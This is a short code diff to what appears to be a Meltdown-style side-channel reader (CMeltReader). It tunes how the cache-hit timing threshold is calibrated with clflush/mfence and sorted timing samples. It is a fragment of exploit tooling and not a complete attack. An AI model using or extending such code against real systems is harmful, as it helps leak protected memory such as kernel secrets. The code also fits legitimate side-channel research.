@@ -8,6 +8,7 @@
 #include <sys/types.h>
 #include <sys/stat.h>
 #include <fcntl.h>
+#include <vector>
 #include <algorithm>
 
 #include "meltreader.hpp"
@@ -47,12 +48,13 @@ static int mysqrt(long val)
 
 #define flushpos(addr) __asm__ __volatile__("mfence\n" "clflush 0(%0)\n" :: "r"(addr));
 
-#define ESTIMATE_CYCLES 100
+#define ESTIMATE_CYCLES 20
 void CMeltReader::find_cache_hit_threshold()
 {
 	int64_t cached=0x7fffffff, uncached=0x7fffffff, i;
 	char * target_array = m_probe_array;
 	volatile int v;
+	std::vector<int64_t> uns;
 	
 	sched_yield();
 	for (i = 0; i < ESTIMATE_CYCLES; i++)
@@ -61,10 +63,13 @@ void CMeltReader::find_cache_hit_threshold()
 		cached = std::min<int64_t>(cached, get_access_time(target_array));
 	}
 	
-	for (i = 0; i < ESTIMATE_CYCLES; i++) {
+	for (i = 0; i < ESTIMATE_CYCLES*3; i++) {
 		flushpos(target_array);
-		uncached = std::min<int64_t>(uncached, get_access_time(target_array));
+		int64_t t = get_access_time(target_array);
+		uns.push_back(t);
 	}
+	std::sort(uns.begin(), uns.end());
+	uncached = uns[ESTIMATE_CYCLES];
 	
 	m_th1 = (int)mysqrt(cached*uncached);
 	m_th2 = uncached*2;
